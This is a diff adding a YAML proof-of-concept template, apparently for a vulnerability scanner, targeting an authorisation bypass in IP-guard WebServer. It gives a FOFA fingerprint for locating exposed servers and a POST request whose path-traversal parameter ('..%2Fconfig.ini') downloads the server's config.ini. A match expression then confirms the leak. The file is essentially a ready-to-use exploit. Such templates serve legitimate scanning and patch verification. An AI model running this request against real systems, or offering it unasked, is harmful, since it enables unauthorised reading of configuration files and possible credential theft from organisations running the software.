@@ -1,0 +1,18 @@
+id: poc-yaml-ip-guard-webserver-permission-bypass
+info:
+  name: IP-guard WebServer 权限绕过漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: IP-guard WebServer
+  fofa: icon_hash="2030860561"
+requests:
+- method: POST
+  path: /ipg/appr/MApplyList/downloadFile_client/getdatarecord
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A
+  expression: status_code == 200 && contains(body,"[webconfig]") && contains(body,"[viewcfg]")
+    && contains(content_type,"application/x-wine-extension-ini")
+variables: {}
+transport: http
